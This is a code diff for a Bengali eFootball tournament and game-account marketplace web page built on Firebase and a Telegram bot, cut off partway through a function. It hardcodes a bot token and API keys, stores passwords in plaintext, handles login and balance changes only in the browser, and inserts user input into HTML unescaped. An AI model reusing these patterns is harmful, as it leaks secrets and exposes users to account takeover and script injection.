@@ -1,405 +1,1077 @@
+<?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE html>
-<html lang="en">
+<html b:css='false' b:js='false' lang='bn' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Victory eFootball Battle Mini App</title>
-    <!-- Telegram Web App Script -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Supabase Library -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <meta charset='UTF-8'/>
+    <meta content='width=device-width, initial-scale=1.0' name='viewport'/>
+    <title><data:blog.pageTitle/></title>
     
-    <style>
-        body {
-            background-color: #0f172a;
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 10px;
-            padding-bottom: 70px;
+    <script src='https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js'/>
+    <script src='https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js'/>
+    <script src='https://www.gstatic.com/firebasejs/9.22.0/firebase-analytics-compat.js'/>
+
+    <b:skin><![CDATA[
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0b0f19; color: #f3f4f6; line-height: 1.6; padding-bottom: 70px; }
+        
+        .auth-wrapper { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; background-color: #0b0f19; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
+        .auth-container { width: 100%; max-width: 420px; background: linear-gradient(145deg, #171f2d, #111827); padding: 35px 30px; border-radius: 16px; box-shadow: 0 12px 35px rgba(0,0,0,0.6); border: 1px solid #2d3748; position: relative; overflow: hidden; }
+        .auth-container::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: linear-gradient(90deg, #25d366, #3b82f6); }
+        .auth-container h2 { text-align: center; margin-bottom: 25px; color: #fff; font-size: 24px; font-weight: 700; }
+        .auth-container h2 span { color: #25d366; }
+        
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; margin-bottom: 6px; font-size: 13px; color: #94a3b8; font-weight: 500; text-transform: uppercase; }
+        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 12px 15px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: #fff; font-size: 15px; outline: none; }
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: #25d366; box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15); }
+        
+        .btn-submit { width: 100%; background: linear-gradient(135deg, #25d366, #20ba5a); color: #fff; border: none; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; transition: all 0.3s ease; }
+        .btn-submit:hover { opacity: 0.9; }
+        .btn-submit:disabled { background: #4b5563; cursor: not-allowed; }
+        
+        .switch-text { text-align: center; margin-top: 20px; font-size: 14px; color: #94a3b8; }
+        .switch-text span { color: #3b82f6; cursor: pointer; font-weight: 600; text-decoration: underline; }
+        
+        nav { background: #1f2937; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #374151; position: sticky; top: 0; z-index: 100; }
+        .logo { font-size: 16px; font-weight: bold; color: #25d366; cursor: pointer; }
+        .nav-right { display: flex; align-items: center; gap: 8px; }
+        .balance-badge { background: #374151; padding: 5px 10px; border-radius: 20px; font-size: 11px; color: #25d366; font-weight: bold; border: 1px solid #4b5563; }
+        .profile-icon { width: 32px; height: 32px; background: #25d366; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; position: relative; font-size: 14px; overflow: hidden; background-size: cover; background-position: center; }
+        
+        .profile-menu { display: none; position: absolute; top: 45px; right: 0; background: #1f2937; border: 1px solid #374151; border-radius: 8px; width: 180px; box-shadow: 0 4px 12px rgba(0,0,0,0.4); z-index: 1000; }
+        .profile-menu a, .profile-menu div { padding: 10px 15px; font-size: 14px; color: #f3f4f6; cursor: pointer; display: block; border-bottom: 1px solid #374151; text-decoration: none; }
+        .profile-menu div:hover { background: #374151; }
+
+        .main-container { max-width: 900px; margin: 20px auto; padding: 15px; }
+        .box { background: #1f2937; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #374151; }
+        
+        .notice-board { background: linear-gradient(135deg, #7f1d1d, #450a0a); border: 1px solid #ef4444; padding: 12px 15px; border-radius: 10px; margin-bottom: 15px; font-size: 13px; color: #fecaca; }
+        .notice-board b { color: #f87171; }
+
+        .tabs { display: flex; gap: 10px; margin-bottom: 15px; overflow-x: auto; padding-bottom: 5px; }
+        .tab-btn { background: #374151; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: bold; white-space: nowrap; }
+        .tab-btn.active { background: #25d366; color: #fff; }
+
+        .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #1f2937; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #374151; z-index: 1000; }
+        .bottom-nav-item { text-align: center; color: #94a3b8; font-size: 11px; font-weight: bold; cursor: pointer; }
+        .bottom-nav-item.active { color: #25d366; }
+
+        .profile-card { background: #1e293b; padding: 20px; border-radius: 12px; border: 1px solid #334155; }
+        .profile-info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #334155; font-size: 14px; }
+        .profile-info-row span:last-child { font-weight: bold; color: #25d366; }
+
+        .slots-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 10px; margin-top: 10px; }
+        .slot-item { background: #1e293b; border: 1px solid #334155; padding: 12px 15px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
+        .slot-item.booked { border-color: #25d366; background: rgba(37, 211, 102, 0.05); }
+        .slot-no { font-weight: bold; color: #facc15; }
+
+        .match-card { background: #1e293b; border: 1px solid #334155; padding: 15px; border-radius: 10px; margin-bottom: 12px; font-size: 13px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        
+        .whatsapp-float-btn { display: flex; align-items: center; justify-content: center; gap: 8px; background: linear-gradient(135deg, #25d366, #128c7e); color: #fff; padding: 12px 15px; border-radius: 8px; font-weight: bold; text-decoration: none; margin-bottom: 15px; font-size: 14px; box-shadow: 0 4px 10px rgba(37, 211, 102, 0.3); transition: all 0.3s ease; }
+        .whatsapp-float-btn:hover { opacity: 0.9; color: #fff; }
+    ]]></b:skin>
+
+    <script type='text/javascript'>
+    //<![CDATA[
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlYj9lohn53maKIp68pbbZEQJKDgsMgug",
+            authDomain: "victory-efootball-battle.firebaseapp.com",
+            projectId: "victory-efootball-battle",
+            storageBucket: "victory-efootball-battle.firebasestorage.app",
+            messagingSenderId: "781703585699",
+            appId: "1:781703585699:web:456ba882ba652a954c0416",
+            measurementId: "G-4DT2T114CG"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
         }
-        .container {
-            max-width: 450px;
-            margin: 0 auto;
+        const db = firebase.firestore();
+
+        const TELEGRAM_BOT_TOKEN = "7659515596:AAGVtejXRJQ5XGr7hmBvpyyV7-Nd14Mj8l4"; 
+        const TELEGRAM_CHAT_ID = "8681927379";
+        const IMGBB_API_KEY = "6d207e02198a847aa98d0a2a901485a2";
+
+        const countriesList = [
+            "Argentina", "Brazil", "France", "Portugal", "England", 
+            "Germany", "Spain", "Italy", "Netherlands", "Belgium", 
+            "Croatia", "Japan", "South Korea", "Morocco", "Uruguay", "Colombia"
+        ];
+
+        window.addEventListener('DOMContentLoaded', () => {
+            checkAuth();
+            populateCountriesDropdown();
+            loadAdminNotice();
+            loadMarketplaceList();
+        });
+
+        function populateCountriesDropdown(takenCountries = []) {
+            let select = document.getElementById("paid-country-select");
+            if (!select) return;
+            select.innerHTML = "<option value=''>দেশ নির্বাচন করুন</option>";
+
+            countriesList.forEach(country => {
+                if (!takenCountries.includes(country)) {
+                    let opt = document.createElement("option");
+                    opt.value = country;
+                    opt.innerText = country;
+                    select.appendChild(opt);
+                }
+            });
         }
-        .card {
-            background: #1e293b;
-            padding: 15px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            border: 1px solid #334155;
-            margin-bottom: 15px;
+
+        function checkAuth() {
+            let isLogged = localStorage.getItem("isLoggedIn");
+            if (isLogged !== "true") {
+                document.getElementById("auth-wrapper-box").style.display = "flex";
+                document.getElementById("signup-box").style.display = "block";
+                document.getElementById("login-box").style.display = "none";
+                document.getElementById("main-site-content").style.display = "none";
+            } else {
+                document.getElementById("auth-wrapper-box").style.display = "none";
+                document.getElementById("main-site-content").style.display = "block";
+                loadUserData();
+                loadMatchesList();
+            }
         }
-        h2, h3 {
-            color: #eab308;
-            text-align: center;
-            margin-top: 0;
+
+        function loadUserData() {
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || { 
+                name: "Player", phone: "", balance: 0, 
+                pvpCount: 0, paidCount: 0, profileImg: "" 
+            };
+            
+            if (user.phone) {
+                db.collection("users").doc(user.phone).get().then((doc) => {
+                    if (doc.exists) {
+                        let data = doc.data();
+                        user.balance = data.balance || 0;
+                        user.pvpCount = data.pvpCount || 0;
+                        user.paidCount = data.paidCount || 0;
+                        user.profileImg = data.profileImg || "";
+                        localStorage.setItem("registeredUser", JSON.stringify(user));
+                        updateUI(user);
+                    } else {
+                        updateUI(user);
+                    }
+                }).catch(() => { updateUI(user); });
+            } else {
+                updateUI(user);
+            }
         }
-        .form-group {
-            margin-bottom: 12px;
+
+        function updateUI(user) {
+            document.getElementById("user-balance-badge").innerText = (user.balance || 0) + " Tk";
+            
+            let avatarLetter = (user.name || "P").charAt(0).toUpperCase();
+            let navAvatar = document.getElementById("profile-avatar-letter");
+            
+            let profAvatarImg = document.getElementById("prof-avatar-img");
+            let profAvatarLetter = document.getElementById("prof-avatar-letter");
+            let profImgInput = document.getElementById("prof-img-url-input");
+
+            if (user.profileImg) {
+                navAvatar.style.backgroundImage = "url('" + user.profileImg + "')";
+                navAvatar.innerText = "";
+
+                if(profAvatarImg && profAvatarLetter) {
+                    profAvatarImg.src = user.profileImg;
+                    profAvatarImg.style.display = "block";
+                    profAvatarLetter.style.display = "none";
+                }
+                if(profImgInput) profImgInput.value = user.profileImg;
+            } else {
+                navAvatar.style.backgroundImage = "none";
+                navAvatar.innerText = avatarLetter;
+
+                if(profAvatarImg && profAvatarLetter) {
+                    profAvatarImg.style.display = "none";
+                    profAvatarLetter.style.display = "block";
+                    profAvatarLetter.innerText = avatarLetter;
+                }
+            }
+
+            document.getElementById("prof-name").innerText = user.name || "-";
+            document.getElementById("prof-phone").innerText = user.phone || "-";
+            document.getElementById("prof-balance").innerText = (user.balance || 0) + " Tk";
+            document.getElementById("prof-pvp").innerText = (user.pvpCount || 0) + " টি";
+            document.getElementById("prof-paid").innerText = (user.paidCount || 0) + " টি";
         }
-        label {
-            display: block;
-            font-size: 12px;
-            color: #94a3b8;
-            margin-bottom: 4px;
+
+        function updateProfilePicture() {
+            let imgUrl = document.getElementById("prof-img-url-input").value.trim();
+            if (!imgUrl) {
+                alert("⚠️ দয়া করে সঠিক ছবির ইমেজ লিংক দিন।");
+                return;
+            }
+
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+            user.profileImg = imgUrl;
+            localStorage.setItem("registeredUser", JSON.stringify(user));
+
+            if (user.phone) {
+                db.collection("users").doc(user.phone).update({
+                    profileImg: imgUrl
+                }).then(() => {
+                    alert("✅ সফলভাবে প্রোফাইল ছবি আপডেট হয়েছে!");
+                    loadUserData();
+                }).catch(err => { alert("ত্রুটি: " + err.message); });
+            }
         }
-        input, select, textarea {
-            width: 100%;
-            padding: 10px;
-            background: #0f172a;
-            border: 1px solid #475569;
-            color: #fff;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 14px;
+
+        function uploadProfileFile() {
+            let fileInput = document.getElementById("prof-file-input");
+            if (fileInput.files.length === 0) return;
+            
+            let file = fileInput.files[0];
+            let formData = new FormData();
+            formData.append("image", file);
+            let inputField = document.getElementById("prof-img-url-input");
+            inputField.value = "আপলোড হচ্ছে...";
+
+            fetch("https://api.imgbb.com/1/upload?key=" + IMGBB_API_KEY, {
+                method: "POST",
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    inputField.value = data.data.url;
+                    updateProfilePicture();
+                } else {
+                    alert("আপলোড ব্যর্থ হয়েছে।");
+                    inputField.value = "";
+                }
+            })
+            .catch(() => {
+                alert("ইন্টারনেট সমস্যা।");
+                inputField.value = "";
+            });
         }
-        button {
-            width: 100%;
-            background: linear-gradient(135deg, #25d366, #128c7e);
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 5px;
-            font-size: 14px;
+
+        // Marketplace ID Sell Screenshot Upload
+        function uploadMarketScreenshot() {
+            let fileInput = document.getElementById("market-file-input");
+            let urlInput = document.getElementById("market-img-url");
+            if (fileInput.files.length === 0) return;
+
+            let file = fileInput.files[0];
+            let formData = new FormData();
+            formData.append("image", file);
+            urlInput.value = "আপলোড হচ্ছে...";
+
+            fetch("https://api.imgbb.com/1/upload?key=" + IMGBB_API_KEY, {
+                method: "POST",
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    urlInput.value = data.data.url;
+                } else {
+                    alert("ছবি আপলোড ব্যর্থ হয়েছে।");
+                    urlInput.value = "";
+                }
+            })
+            .catch(() => {
+                alert("ইন্টারনেট সমস্যা।");
+                urlInput.value = "";
+            });
         }
-        .switch-text {
-            text-align: center;
-            font-size: 12px;
-            color: #94a3b8;
-            margin-top: 12px;
-            cursor: pointer;
+
+        function handleSellPostSubmit(event) {
+            event.preventDefault();
+            let title = document.getElementById("market-title").value.trim();
+            let price = parseFloat(document.getElementById("market-price").value);
+            let imgUrl = document.getElementById("market-img-url").value.trim();
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+
+            if (!title || isNaN(price) || !imgUrl) {
+                alert("⚠️ সব তথ্য এবং স্ক্রিনশট লিংক সঠিকভাবে দিন।");
+                return;
+            }
+
+            let postData = {
+                itemType: "eFootball ID Sell",
+                title: title,
+                price: price,
+                imgUrl: imgUrl,
+                sellerName: user.name,
+                sellerPhone: user.phone,
+                sellerImg: user.profileImg || "",
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            };
+
+            db.collection("marketplace").add(postData).then(() => {
+                alert("✅ সফলভাবে আপনার আইডি বিক্রির বিজ্ঞাপন পোস্ট করা হয়েছে এবং হোমে পাবলিশ হয়েছে!");
+                event.target.reset();
+                document.getElementById("market-img-url").value = "";
+                loadMarketplaceList();
+            }).catch(err => alert("ত্রুটি: " + err.message));
         }
-        .switch-text span {
-            color: #38bdf8;
-            font-weight: bold;
+
+        // পাব্লিক মার্কেটপ্লেস লোড (যেটি যেকোনো ইউজার হোমে দেখতে পাবে)
+        function loadMarketplaceList() {
+            let container = document.getElementById("marketplace-items-container");
+            if (!container) return;
+
+            db.collection("marketplace").orderBy("timestamp", "desc").get().then(snapshot => {
+                container.innerHTML = "";
+                if (snapshot.empty) {
+                    container.innerHTML = "<p style='font-size:13px; color:#94a3b8;'>বর্তমানে কোনো আইডি বিক্রির পোস্ট নেই।</p>";
+                    return;
+                }
+
+                snapshot.forEach(doc => {
+                    let d = doc.data();
+                    let div = document.createElement("div");
+                    div.style.cssText = "background:#1e293b; border:1px solid #334155; padding:12px; border-radius:8px; margin-bottom:12px;";
+                    
+                    let avatarInitial = (d.sellerName || "U").charAt(0).toUpperCase();
+                    let avatarStyle = d.sellerImg ? "background-image:url('" + d.sellerImg + "'); background-size:cover;" : "background:#25d366;";
+
+                    div.innerHTML = `
+                        <div style='display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;'>
+                            <b style='color:#facc15; font-size:14px;'>🎮 ${d.itemType}</b>
+                            <span style='background:#25d366; color:#fff; padding:2px 8px; border-radius:4px; font-size:12px; font-weight:bold;'>দাম: ${d.price} Tk</span>
+                        </div>
+                        <p style='font-size:13px; color:#cbd5e1; margin-bottom:8px;'>বিবরণ: ${d.title}</p>
+                        
+                        <!-- বিক্রেতার প্রোফাইল দেখার অপশন -->
+                        <div style='display:flex; align-items:center; gap:8px; margin-bottom:8px; background:#0f172a; padding:6px 10px; border-radius:6px; cursor:pointer;' onclick='viewSellerProfile("${d.sellerPhone}", "${d.sellerName}", "${d.sellerImg || ""}")'>
+                            <div style='width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; color:#fff; font-size:11px; font-weight:bold; ${avatarStyle}'>${d.sellerImg ? "" : avatarInitial}</div>
+                            <span style='font-size:12px; color:#38bdf8; text-decoration:underline;'>বিক্রেতা: ${d.sellerName} (প্রোফাইল দেখুন)</span>
+                        </div>
+
+                        <div style='margin-bottom:8px;'>
+                            <a href='${d.imgUrl}' target='_blank'>
+                                <img src='${d.imgUrl}' style='width:100%; max-height:180px; object-fit:cover; border-radius:6px; border:1px solid #334155;'/>
+                            </a>
+                        </div>
+                        <a href='https://api.whatsapp.com/send?phone=+88${d.sellerPhone}&text=I%20want%20to%20buy%20your%20eFootball%20ID:%20${encodeURIComponent(d.title)}%20for%20${d.price}Tk' target='_blank' style='display:block; text-align:center; background:#25d366; color:#fff; padding:8px; border-radius:6px; font-size:12px; font-weight:bold; text-decoration:none;'>
+                            💬 বিক্রেতার সাথে যোগাযোগ করুন (WhatsApp)
+                        </a>
+                    `;
+                    container.appendChild(div);
+                });
+            }).catch(() => {});
         }
-        .nav-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: #1e293b;
-            border-top: 1px solid #334155;
-            display: flex;
-            justify-content: space-around;
-            padding: 8px 0;
-            z-index: 1000;
+
+        // অন্য ইউজারের প্রোফাইল পপআপ বা সেকশনে দেখার ফাংশন
+        function viewSellerProfile(phone, name, img) {
+            db.collection("users").doc(phone).get().then(doc => {
+                let pvp = 0, paid = 0, bal = "লুকানো";
+                if(doc.exists) {
+                    let data = doc.data();
+                    pvp = data.pvpCount || 0;
+                    paid = data.paidCount || 0;
+                }
+                
+                let modalHtml = `
+                    <div id='seller-modal' style='position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; display:flex; justify-content:center; align-items:center; padding:15px;'>
+                        <div style='background:#1f2937; padding:20px; border-radius:12px; width:100%; max-width:350px; border:1px solid #374151; text-align:center; position:relative;'>
+                            <button onclick='document.getElementById("seller-modal").remove()' style='position:absolute; top:10px; right:10px; background:#ef4444; color:#fff; border:none; width:24px; height:24px; border-radius:50%; cursor:pointer;'>✕</button>
+                            <div style='width:60px; height:60px; border-radius:50%; margin:0 auto 10px auto; display:flex; align-items:center; justify-content:center; font-size:24px; color:#fff; font-weight:bold; ${img ? "background-image:url("+img+"); background-size:cover;" : "background:#25d366;"}'>${img ? "" : name.charAt(0)}</div>
+                            <h3 style='color:#fff; font-size:16px; margin-bottom:5px;'>${name}</h3>
+                            <p style='color:#94a3b8; font-size:12px; margin-bottom:15px;'>নম্বর: ${phone}</p>
+                            <div style='text-align:left; background:#111827; padding:10px; border-radius:8px; font-size:13px;'>
+                                <div style='display:flex; justify-content:between; margin-bottom:6px;'><span>PvP ম্যাচ খেলা:</span><b>${pvp} টি</b></div>
+                                <div style='display:flex; justify-content:between;'><span>Paid টুর্নামেন্ট:</span><b>${paid} টি</b></div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                document.body.insertAdjacentHTML('beforeend', modalHtml);
+            });
         }
-        .nav-btn {
-            background: none;
-            border: none;
-            color: #94a3b8;
-            font-size: 11px;
-            text-align: center;
-            cursor: pointer;
-            flex: 1;
+
+        function buyCoinPack(coinAmount, price) {
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+            let konamiId = prompt("আপনার eFootball আইডি বা কোনামি আইডি (Email) লিখুন যেখানে কয়েন নিতে চান:");
+            if (!konamiId) return;
+
+            let message = "🪙 কয়েন অর্ডার রিকোয়েস্ট!\n👤 ক্রেতা: " + user.name + " (" + user.phone + ")\n📦 প্যাক: " + coinAmount + " Coins\n💵 দাম: " + price + " Tk\n🔑 কোনামি আইডি: " + konamiId;
+            sendTelegramMessage(message, "সফলভাবে কয়েন অর্ডার সাবমিট হয়েছে! এডমিন আপনার আইডিতে কয়েন টপ-আপ করে দেবেন।");
         }
-        .nav-btn.active {
-            color: #38bdf8;
-            font-weight: bold;
+
+        function loadAdminNotice() {
+            db.collection("settings").doc("notice").get().then((doc) => {
+                let noticeBox = document.getElementById("dynamic-admin-notice");
+                if (doc.exists && doc.data().text && noticeBox) {
+                    noticeBox.innerHTML = "📢 <b>জরুরি নোটিশ:</b> " + doc.data().text;
+                    noticeBox.style.display = "block";
+                }
+            }).catch(() => {});
         }
-        .page-section {
-            display: none;
+
+        function switchToLogin() {
+            document.getElementById("signup-box").style.display = "none";
+            document.getElementById("login-box").style.display = "block";
         }
-        .page-section.active {
-            display: block;
+
+        function switchToSignup() {
+            document.getElementById("login-box").style.display = "none";
+            document.getElementById("signup-box").style.display = "block";
         }
-    </style>
+
+        function handleSignup(event) {
+            event.preventDefault();
+            let submitBtn = document.getElementById("su-btn");
+            let name = document.getElementById("su-name").value.trim();
+            let phone = document.getElementById("su-phone").value.trim();
+            let pass = document.getElementById("su-pass").value.trim();
+
+            let phoneRegex = /^01[3-9]\d{8}$/;
+            if (!phoneRegex.test(phone)) {
+                alert("⚠️ সঠিক বাংলাদেশি মোবাইল নম্বর দিন (যেমন: 01XXXXXXXXX)");
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.innerText = "যাচাই করা হচ্ছে...";
+
+            db.collection("users").doc(phone).get().then((doc) => {
+                if (doc.exists) {
+                    alert("⚠️ এই মোবাইল নম্বর দিয়ে ইতিমধ্যে অ্যাকাউন্ট রয়েছে!");
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = "সাইন আপ করুন";
+                    switchToLogin();
+                } else {
+                    let userData = { 
+                        name: name, phone: phone, pass: pass, 
+                        balance: 0, pvpCount: 0, paidCount: 0, profileImg: "" 
+                    };
+                    db.collection("users").doc(phone).set(userData).then(() => {
+                        localStorage.setItem("registeredUser", JSON.stringify(userData));
+                        localStorage.setItem("isLoggedIn", "true");
+                        alert("সাইন আপ সফল হয়েছে!");
+                        checkAuth();
+                    }).catch((error) => {
+                        alert("ত্রুটি: " + error.message);
+                        submitBtn.disabled = false;
+                        submitBtn.innerText = "সাইন আপ করুন";
+                    });
+                }
+            });
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+            let phone = document.getElementById("li-phone").value.trim();
+            let pass = document.getElementById("li-pass").value.trim();
+
+            db.collection("users").doc(phone).get().then((doc) => {
+                if (doc.exists) {
+                    let data = doc.data();
+                    if (data.pass === pass) {
+                        let userData = {
+                            name: data.name, phone: data.phone, pass: data.pass,
+                            balance: data.balance || 0,
+                            pvpCount: data.pvpCount || 0, paidCount: data.paidCount || 0,
+                            profileImg: data.profileImg || ""
+                        };
+                        localStorage.setItem("registeredUser", JSON.stringify(userData));
+                        localStorage.setItem("isLoggedIn", "true");
+                        alert("লগইন সফল হয়েছে!");
+                        checkAuth();
+                    } else {
+                        alert("ভুল পাসওয়ার্ড!");
+                    }
+                } else {
+                    alert("এই নম্বরে কোনো অ্যাকাউন্ট নেই!");
+                }
+            });
+        }
+
+        function handleLogout() {
+            localStorage.removeItem("isLoggedIn");
+            localStorage.removeItem("registeredUser");
+            alert("লগআউট করা হয়েছে!");
+            checkAuth();
+        }
+
+        function toggleProfileMenu() {
+            let menu = document.getElementById("profileMenu");
+            menu.style.display = (menu.style.display === "block") ? "none" : "block";
+        }
+
+        function switchSection(sectionName) {
+            document.getElementById("home-section").style.display = (sectionName === 'home') ? 'block' : 'none';
+            document.getElementById("deposit-section").style.display = (sectionName === 'deposit') ? 'block' : 'none';
+            document.getElementById("withdraw-section").style.display = (sectionName === 'withdraw') ? 'block' : 'none';
+            document.getElementById("profile-section").style.display = (sectionName === 'profile') ? 'block' : 'none';
+            
+            let navItems = document.querySelectorAll('.bottom-nav-item');
+            navItems.forEach(item => item.classList.remove('active'));
+            if(sectionName === 'home') navItems[0].classList.add('active');
+            else if(sectionName === 'deposit') navItems[1].classList.add('active');
+            else if(sectionName === 'withdraw') navItems[2].classList.add('active');
+            else if(sectionName === 'profile') navItems[3].classList.add('active');
+        }
+
+        function switchMainTab(tabName) {
+            document.getElementById("tab-content-paid").style.display = (tabName === 'paid') ? 'block' : 'none';
+            document.getElementById("tab-content-slot").style.display = (tabName === 'slot') ? 'block' : 'none';
+            document.getElementById("tab-content-free").style.display = (tabName === 'free') ? 'block' : 'none';
+            document.getElementById("tab-content-market").style.display = (tabName === 'market') ? 'block' : 'none';
+            document.getElementById("tab-content-coin").style.display = (tabName === 'coin') ? 'block' : 'none';
+            
+            document.getElementById("main-tab-paid").className = (tabName === 'paid') ? 'tab-btn active' : 'tab-btn';
+            document.getElementById("main-tab-slot").className = (tabName === 'slot') ? 'tab-btn active' : 'tab-btn';
+            document.getElementById("main-tab-free").className = (tabName === 'free') ? 'tab-btn active' : 'tab-btn';
+            document.getElementById("main-tab-market").className = (tabName === 'market') ? 'tab-btn active' : 'tab-btn';
+            document.getElementById("main-tab-coin").className = (tabName === 'coin') ? 'tab-btn active' : 'tab-btn';
+
+            if(tabName === 'market') loadMarketplaceList();
+        }
+
+        function switchPaidRoomTab(amount, btnElement) {
+            let buttons = document.querySelectorAll('#paid-room-tabs-container .tab-btn');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            if(btnElement) btnElement.classList.add('active');
+            document.getElementById("paid-room-select").value = amount;
+            loadPaidTournamentsList(); 
+        }
+
+        function sendTelegramMessage(message, successMessage) {
+            let url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+            let data = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" };
+            fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) })
+            .then(res => res.json())
+            .then(resData => { if(resData.ok && successMessage) alert(successMessage); });
+        }
+
+        function handleDeposit(event) {
+            event.preventDefault();
+            let method = document.getElementById("dep-method").value;
+            let amount = parseFloat(document.getElementById("dep-amount").value);
+            let senderNo = document.getElementById("dep-sender-no").value.trim();
+            let trxId = document.getElementById("dep-trxid").value.trim();
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+
+            if (isNaN(amount) || amount <= 0) {
+                alert("⚠️ সঠিক ডিপোজিট পরিমাণ লিখুন।");
+                return;
+            }
+
+            let message = "💰 নতুন ডিপোজিট রিকোয়েস্ট!\n👤 " + user.name + " (" + user.phone + ")\n💳 " + method + " - " + amount + " Tk\n📱 প্রেরক: " + senderNo + "\n🔑 TrxID: " + trxId;
+            sendTelegramMessage(message, "ডিপোজিট রিকোয়েস্ট সফলভাবে অ্যাডমিনের কাছে পাঠানো হয়েছে!");
+            event.target.reset();
+        }
+
+        function handleWithdraw(event) {
+            event.preventDefault();
+            let method = document.getElementById("wd-method").value;
+            let amount = parseFloat(document.getElementById("wd-amount").value);
+            let targetPhone = document.getElementById("wd-target-phone").value.trim();
+            let note = document.getElementById("wd-trxid").value.trim();
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+
+            if (amount < 100) { alert("⚠️ সর্বনিম্ন ১০০ টাকা উইথড্র করতে হবে।"); return; }
+            if (amount > (user.balance || 0)) { alert("⚠️ আপনার একাউন্টে পর্যাপ্ত টাকা ব্যালেন্স নেই।"); return; }
+
+            user.balance -= amount;
+            localStorage.setItem("registeredUser", JSON.stringify(user));
+
+            if (user.phone) {
+                db.collection("users").doc(user.phone).update({ balance: user.balance }).catch(() => {});
+            }
+            loadUserData();
+
+            let message = "💳 নতুন টাকা উইথড্র রিকোয়েস্ট!\n👤 " + user.name + " (" + user.phone + ")\n💳 " + method + " - " + amount + " Tk\n📱 নম্বর: " + targetPhone + "\n🔑 নোট: " + note;
+            sendTelegramMessage(message, "উইথড্র রিকোয়েস্ট সফলভাবে সাবমিট হয়েছে!");
+            event.target.reset();
+        }
+
+        function applyPaidTournament(event) {
+            event.preventDefault();
+            let roomFee = parseFloat(document.getElementById("paid-room-select").value);
+            let playerName = document.getElementById("paid-player-name").value.trim();
+            let playerId = document.getElementById("paid-player-id").value.trim();
+            let selectedCountry = document.getElementById("paid-country-select").value;
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+
+            if (!playerName || !playerId || !selectedCountry) {
+                alert("⚠️ সঠিক ইন-গেম নাম, আইডি এবং দেশ সিলেক্ট করুন!");
+                return;
+            }
+
+            if ((user.balance || 0) < roomFee) {
+                alert("⚠️ আপনার একাউন্টে পর্যাপ্ত টাকা ব্যালেন্স নেই!");
+                return;
+            }
+
+            db.collection("matches").where("type", "==", "Paid Tournament").where("fee", "==", roomFee).get().then((snapshot) => {
+                let validDocs = [];
+                snapshot.forEach(doc => {
+                    let d = doc.data();
+                    if (d.playerName && d.country) {
+                        validDocs.push({ id: doc.id, ...d });
+                    }
+                });
+
+                if (validDocs.length >= 16) {
+                    alert("⚠️ এই টুর্নামেন্টে ইতিমধ্যে সর্বোচ্চ ১৬ জন প্লেয়ার পূর্ণ হয়ে গেছে!");
+                    return;
+                }
+
+                let takenCountries = [];
+                let alreadyJoined = false;
